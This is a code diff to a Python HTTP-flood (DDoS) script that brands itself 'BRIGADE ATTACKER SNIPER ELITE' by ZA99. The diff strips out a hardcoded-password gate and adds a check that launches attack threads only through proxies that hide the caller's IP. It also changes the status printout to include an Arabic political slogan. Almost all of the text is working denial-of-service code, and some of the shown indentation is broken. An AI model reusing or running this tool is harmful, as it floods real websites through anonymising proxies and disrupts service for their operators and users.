@@ -26,13 +26,6 @@ def logo():
 \033[1;34m                                                          \033[0m          
 \033[1;34m    ## BRIGADE ATTACKER SNIPER ELITE ==> internal script By:ZA99\033[0m ##
 """)
-# Password authentication function
-def authenticate():
-   password = "6453"  # The password to access the tool
-   user_password = getpass.getpass(prompt="\033[1;36mEnter the password to access the tool: \033[0m")
-   if user_password != password:
-   print("\033[1;31mIncorrect password. Exiting...\033[0m")
-   exit()
 
 def check_prox(array, url):
 	ip = r.post("http://ip.beget.ru/").text
@@ -47,6 +40,7 @@ def check(ip, prox, url):
 		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
 	except:
 		ipx = ip
+	if ip != ipx:
 		thread_list = []
 		t = threading.Thread (target=ddos, args=(prox, url))
 		thread_list.append(t)
@@ -68,7 +62,7 @@ def start_ddos(prox, url, headers, proxies, color):
 		s = r.Session()
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
-			print(color+"{}".format(prox))
+			print(color+"{}حقوق الفلسطينيين المهجرين".format(prox))
 	except:
 		pass
 
